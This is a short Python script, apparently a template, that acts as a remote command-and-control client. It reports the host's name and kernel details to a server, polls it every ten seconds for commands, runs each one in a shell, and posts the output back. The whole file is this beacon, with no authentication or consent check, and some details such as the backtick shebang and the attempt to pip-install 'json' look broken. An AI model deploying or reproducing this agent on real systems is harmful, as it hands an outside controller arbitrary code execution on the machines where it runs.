#!`which python`


try:
    import requests
    import time
    import json
    import subprocess
except ImportError:
    from pip._internal import main
    packages=['requests','json']
    for p in packages:
        main(('install',p,))
    


HOSTNAME="`hostname`"
UNAME="`uname -a`"
HOST="`echo $HOST`"
HOSTID=json.loads(requests.post('http://' + HOST + '/register_client',data={
    'hostname':HOSTNAME,
    'uname':UNAME,
}).text)['hostid']


def do_cmd(cmd):
    return subprocess.check_output(cmd,shell=True).decode().strip()


while True:
    r=requests.post('http://'+HOST+'/get_pending', data={
        'hostname':HOSTNAME,
        'uname':UNAME,
        'hostid':HOSTID,
    })
    control=json.loads(r.text)
    print(control)
    response={'hostid':HOSTID}
    if len(control['cmds']) > 0:
        response['command_data'] = [
            (cmdid, do_cmd(cmd),)
            for cmdid, cmd in control['cmds']
        ]
    print(response)
    if len(response) > 1:
        requests.post('http://'+HOST+'/submit_pending',data=response)
    time.sleep(10)
    

